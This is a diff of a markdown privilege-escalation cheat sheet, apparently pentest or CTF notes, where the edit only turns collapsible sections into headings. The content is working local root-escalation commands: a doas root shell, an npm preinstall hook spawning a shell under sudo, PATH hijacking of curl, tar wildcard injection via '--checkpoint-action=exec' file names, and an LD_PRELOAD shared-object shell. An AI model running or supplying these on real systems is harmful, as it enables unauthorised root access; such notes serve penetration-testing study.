@@ -29,15 +29,14 @@ ubuntu@ajkavanagh-bionic-test:~$ lxc storage list
 doas -u root openssl enc -in file
 doas -u root /bin/bash
 ```
-with npm -u
+#### with npm -u
 
 ```bash
 mkdir ~/tmp
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
 sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
 ```
-</details>
-<details><summary>PATH</summary>
+#### PATH
 
 ```bash
 echo /bin/sh > curl
@@ -46,8 +45,7 @@ export PATH=/tmp:$PATH
 ./app_that_calls_curl
 ```
 
-</details>
-<details><summary>tar</summary>
+#### tar
 
 ```bash
 cat > /home/andre/backup/rev << EOF
@@ -60,8 +58,7 @@ echo "" > "/home/andre/backup/--checkpoint=1"
 echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
 chmod +x rev
 ```
-</details>
-<details><summary>env_keep += LD_PRELOAD</summary>
+#### env_keep += LD_PRELOAD
 
 ```bash
 cd /tmp
@@ -79,4 +76,3 @@ EOF
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
-</details>
